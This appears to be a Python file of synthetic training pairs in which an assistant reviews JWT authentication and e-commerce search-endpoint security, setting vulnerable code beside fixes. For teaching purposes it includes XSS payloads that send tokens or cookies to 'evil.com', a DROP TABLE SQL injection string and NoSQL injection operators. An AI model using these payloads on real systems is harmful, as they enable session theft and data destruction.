"""Phase 2B: Advanced Reasoning — Adversarial Self-Testing (Part 9/10)"""

PAIRS = [
    (
        "thinking/adversarial-jwt-implementation",
        "I'm implementing JWT authentication for our API. Here's my current approach: generate a JWT with the user's ID and role on login, verify it on each request, and store the secret in an environment variable. What am I missing?",
        r'''<think>
JWT implementation security review. Let me systematically attack this implementation.

The described approach:
1. Generate JWT with user ID + role on login
2. Verify on each request
3. Secret in env var

Let me think about each attack vector.

**Attack 1: Algorithm confusion (Critical)**
If the server accepts the `alg` header from the token without validation, attacker can:
- Set alg: "none" → unsigned token accepted
- Set alg: "HS256" when server uses RS256 → use the public key as HMAC secret
Must explicitly specify the allowed algorithm during verification.

**Attack 2: Secret strength**
"store the secret in an environment variable" — but HOW STRONG is the secret?
If it's `JWT_SECRET=mysecret`, it can be brute-forced.
Need at minimum 256-bit random key for HS256.

**Attack 3: No token expiration mentioned**
If JWTs don't expire, a stolen token works forever.
Need `exp` claim with reasonable TTL (15-60 min for access tokens).

**Attack 4: No token revocation**
JWTs are stateless. If a user logs out or is banned, their existing JWT is still valid until expiration.
Need either: short expiration + refresh tokens, or a token blacklist/revocation list.

**Attack 5: Role in JWT payload**
If role is in the JWT and there's no re-validation, a user who gets demoted still has admin access until their token expires.

**Attack 6: JWT in localStorage (if web app)**
XSS can steal tokens from localStorage. HttpOnly cookies are safer for web apps.

**Attack 7: No token binding**
Token doesn't bind to IP, device, or fingerprint. Stolen token works from any location.

**Attack 8: Refresh token handling (if using them)**
Where are refresh tokens stored? How are they rotated? Can they be reused after rotation (replay attack)?

**Attack 9: Information leakage**
JWT payload is base64-encoded, not encrypted. Anyone can decode it. Don't put sensitive data (email, SSN) in the payload.

**Attack 10: Clock skew**
Token expiration depends on server clock. If servers have different times, expired tokens may be accepted.

Let me prioritize these from most critical to nice-to-have.
</think>

Let me attack your JWT implementation systematically. I found **10 potential vulnerabilities**, ranked by severity.

## Critical Vulnerabilities

### 1. Algorithm Confusion Attack

```python
# ❌ VULNERABLE: accepts algorithm from token
import jwt
decoded = jwt.decode(token, SECRET_KEY)
# Attacker sends token with "alg": "none" → unsigned token accepted!
# Attacker sends "alg": "HS256" with your RSA public key → forged token!

# ✅ FIXED: explicitly specify allowed algorithms
decoded = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
# Server ONLY accepts HS256 — ignores alg header from token
```

### 2. No Token Expiration

```python
# ❌ You mentioned: "generate JWT with user ID and role"
# But no mention of expiration. Token valid FOREVER if stolen.
payload = {"user_id": 42, "role": "admin"}  # No exp!

# ✅ FIXED: short-lived access tokens
payload = {
    "user_id": 42,
    "role": "admin",
    "exp": datetime.utcnow() + timedelta(minutes=15),  # Expires in 15 min
    "iat": datetime.utcnow(),                           # Issued at
    "jti": str(uuid4()),                                 # Unique token ID
}
```

### 3. Weak Secret Key

```python
# ❌ Common mistake
JWT_SECRET = "mysecret"           # Brute-forceable in seconds
JWT_SECRET = "company-name-2024"  # Dictionary attackable

# ✅ FIXED: cryptographically random, sufficient length
# Generate with: python -c "import secrets; print(secrets.token_hex(32))"
JWT_SECRET = "a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1"
# 256 bits minimum for HS256
```

## High Severity

### 4. No Token Revocation Strategy

```python
# Scenario: admin fires employee. Employee's JWT still works for 15 minutes.
# Scenario: user changes password. Old sessions should be invalidated.

# Solution A: Short expiration + refresh tokens
ACCESS_TOKEN_TTL = timedelta(minutes=15)    # Short-lived, no revocation needed
REFRESH_TOKEN_TTL = timedelta(days=7)       # Long-lived, stored in DB

# Solution B: Token version in user record
# User table has token_version column (incremented on logout/password change)
payload = {"user_id": 42, "token_version": 3}

def verify_token(token):
    decoded = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    user = db.get_user(decoded["user_id"])
    if user.token_version != decoded["token_version"]:
        raise InvalidToken("Token has been revoked")
    return decoded
```

### 5. Role Stored Without Re-validation

```python
# ❌ Role baked into JWT — stale if user is demoted
payload = {"user_id": 42, "role": "admin"}
# User demoted to "viewer" but token still says "admin" for 15 minutes

# ✅ Option A: Don't store role in JWT — look it up
def get_current_user(token):
    decoded = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    user = db.get_user(decoded["user_id"])
    return user  # Fresh role from database

# ✅ Option B: Store role but keep tokens very short-lived (5 min)
# Acceptable trade-off if you need to avoid DB lookups on every request
```

### 6. JWT Storage in Browser (XSS Risk)

```javascript
// ❌ localStorage: any XSS can steal the token
localStorage.setItem('token', jwt);
// If attacker injects <script>fetch('evil.com?t='+localStorage.token)</script>
// They have your JWT and full account access

// ✅ HttpOnly cookie: JavaScript cannot access it
// Set from server:
// Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/
// Browser automatically sends it with requests — no JS needed
```

## Medium Severity

### 7. Information Leakage in Payload

```python
# ❌ JWT payload is NOT encrypted — anyone can decode it
payload = {
    "user_id": 42,
    "email": "alice@company.com",      # Visible to anyone with the token
    "ssn": "123-45-6789",              # NEVER put PII in JWTs!
    "internal_role": "superadmin",      # Reveals authorization structure
}

# ✅ Minimal payload — only what's needed for identification
payload = {
    "sub": 42,          # Subject (user ID)
    "exp": 1709654400,  # Expiration
    "iat": 1709653500,  # Issued at
    "jti": "unique-id", # Token ID (for revocation)
}
# Look up everything else from the database using the user ID
```

### 8. Missing Refresh Token Rotation

```python
# ❌ Reusable refresh token — if stolen, attacker has permanent access
def refresh(refresh_token):
    user = validate_refresh_token(refresh_token)
    return generate_access_token(user)
    # Same refresh token used forever!

# ✅ Rotate refresh tokens on each use
def refresh(refresh_token):
    user = validate_refresh_token(refresh_token)
    # Invalidate the old refresh token
    db.revoke_refresh_token(refresh_token)
    # Issue NEW refresh token + new access token
    new_refresh = generate_refresh_token(user)
    new_access = generate_access_token(user)
    return {"access_token": new_access, "refresh_token": new_refresh}
    # If old refresh token is used again → it was stolen → revoke ALL tokens
```

## Your Implementation Checklist

```
□ Specify algorithms=["HS256"] in jwt.decode()
□ Set exp claim (15 min for access tokens)
□ Use 256-bit random secret (secrets.token_hex(32))
□ Implement refresh token rotation
□ Don't store sensitive data in JWT payload
□ Use HttpOnly cookies for web apps (not localStorage)
□ Add token version or blacklist for revocation
□ Validate role from database, not just from JWT
□ Set iat and jti claims for audit trail
□ Handle clock skew with leeway parameter
```'''
    ),
    (
        "thinking/adversarial-search-endpoint-abuse",
        "We built a search API endpoint for our e-commerce site. Users type in the search box and it queries our database. What security issues should I worry about?",
        r'''<think>
Search endpoint security — this has a surprisingly large attack surface. Let me think systematically.

**Input-level attacks:**
1. SQL injection — if the search term is concatenated into a query
2. NoSQL injection — if using MongoDB with $where or $regex
3. XSS — if search results or the search term are reflected in HTML without escaping
4. LDAP injection — if search goes to LDAP directory

**Resource-level attacks:**
5. Denial of service via expensive queries — searching for "a" returns millions of results
6. Regex DoS (ReDoS) — if search uses regex matching, crafted patterns can hang the server
7. Wildcard abuse — searching for "*" or "%" to dump entire catalog
8. Pagination abuse — requesting page 999999999 with 10000 results per page

**Data exposure attacks:**
9. Parameter manipulation — adding `?include=internal_price,cost,supplier` to get hidden fields
10. Search for hidden/draft/deleted items — if soft-deleted items appear in results
11. Autocomplete data leakage — autocomplete reveals product names not yet public

**Business logic attacks:**
12. Competitor scraping — automated searches to extract entire product catalog
13. Price monitoring — bots searching to track price changes
14. Inventory inference — search reveals stock levels

**Infrastructure attacks:**
15. Cache poisoning — crafted search terms that poison CDN cache
16. Log injection — search terms with newlines/control characters in server logs

Let me focus on the most impactful ones with code examples.
</think>

Search endpoints have a surprisingly large attack surface. Here are the key vulnerabilities, roughly ordered by severity.

## Critical: SQL/NoSQL Injection

```python
# ❌ VULNERABLE: string concatenation
@app.get("/search")
def search(q: str):
    results = db.execute(f"SELECT * FROM products WHERE name LIKE '%{q}%'")
    # Attacker: q = "'; DROP TABLE products; --"
    # Executed: SELECT * FROM products WHERE name LIKE '%'; DROP TABLE products; --%'

# ✅ FIXED: parameterized query
@app.get("/search")
def search(q: str):
    results = db.execute(
        "SELECT * FROM products WHERE name LIKE %s",
        (f"%{q}%",)
    )

# ❌ MongoDB NoSQL injection
query = {"name": {"$regex": user_input}}
# Attacker sends: {"$gt": ""} → returns all documents
# Or: {"$where": "sleep(10000)"} → DoS

# ✅ FIXED: sanitize and limit operators
import re
def safe_search(q: str):
    # Strip MongoDB operators
    sanitized = re.sub(r'[$]', '', q)
    return collection.find({"name": {"$regex": re.escape(sanitized), "$options": "i"}})
```

## High: Denial of Service via Expensive Queries

```python
# ❌ VULNERABLE: no limits on search
@app.get("/search")
def search(q: str, page: int = 1, per_page: int = 100):
    # Attacker: q="a" → matches millions of products
    # Attacker: per_page=1000000 → massive result set
    # Attacker: page=999999999 → expensive OFFSET query
    results = db.execute(
        f"SELECT * FROM products WHERE name LIKE %s LIMIT {per_page} OFFSET {(page-1)*per_page}",
        (f"%{q}%",)
    )

# ✅ FIXED: enforce limits, minimum query length, query timeout
@app.get("/search")
def search(q: str, page: int = 1, per_page: int = 20):
    # Minimum query length
    if len(q) < 2:
        raise HTTPException(400, "Search query must be at least 2 characters")

    # Cap per_page
    per_page = min(per_page, 50)

    # Cap total depth (don't allow OFFSET > 1000)
    if (page - 1) * per_page > 1000:
        raise HTTPException(400, "Cannot paginate beyond 1000 results. Refine your search.")

    # Query timeout (database level)
    db.execute("SET statement_timeout = 3000")  # 3 second max
    results = db.execute(
        "SELECT * FROM products WHERE name LIKE %s LIMIT %s OFFSET %s",
        (f"%{q}%", per_page, (page - 1) * per_page)
    )
```

## High: Data Exposure

```python
# ❌ VULNERABLE: returns all columns including internal data
@app.get("/search")
def search(q: str):
    results = db.execute("SELECT * FROM products WHERE name LIKE %s", (f"%{q}%",))
    return [dict(row) for row in results]
    # Returns: cost_price, supplier_id, internal_notes, is_deleted...

# ✅ FIXED: explicit column whitelist + filter by visibility
@app.get("/search")
def search(q: str):
    results = db.execute("""
        SELECT id, name, description, price, image_url, category
        FROM products
        WHERE name LIKE %s
          AND is_published = true
          AND deleted_at IS NULL
        LIMIT 20
    """, (f"%{q}%",))
    return [dict(row) for row in results]
```

## Medium: Scraping / Rate Limiting

```python
# ❌ VULNERABLE: no rate limiting → competitor scrapes entire catalog
# Attacker script: for letter in alphabet: for page in range(1000): search(letter, page)

# ✅ FIXED: rate limiting + bot detection
from slowapi import Limiter
limiter = Limiter(key_func=get_remote_address)

@app.get("/search")
@limiter.limit("30/minute")  # 30 searches per minute per IP
def search(q: str):
    # Also consider: CAPTCHA after N searches, require auth for deep pagination,
    # add random delays for suspected bots, block known scraper user agents
    pass
```

## Medium: XSS via Search Results

```python
# ❌ VULNERABLE: search term reflected in page without escaping
# URL: /search?q=<script>document.location='evil.com?c='+document.cookie</script>
# Page renders: "Results for: <script>..."

# ✅ FIXED: always escape output (framework should do this)
# In templates (Jinja2): {{ search_query | e }}  (auto-escaped in most frameworks)
# In API responses: return JSON (inherently safe)
# Set header: Content-Type: application/json
```

## Checklist for Your Search Endpoint

```
Input validation:
  □ Parameterized queries (never concatenate)
  □ Minimum query length (2-3 characters)
  □ Maximum query length (200 characters)
  □ Strip/escape special characters for your DB

Resource protection:
  □ Rate limiting (30-60 searches/minute per user)
  □ Maximum per_page (20-50 items)
  □ Maximum pagination depth (page * per_page < 1000)
  □ Query timeout at database level (3-5 seconds)

Data protection:
  □ Explicit column whitelist (never SELECT *)
  □ Filter out unpublished/deleted/internal items
  □ Don't expose inventory counts or internal pricing

Output safety:
  □ Escape search terms in HTML responses
  □ Content-Type: application/json for API responses
  □ Don't include internal error details in responses
```'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
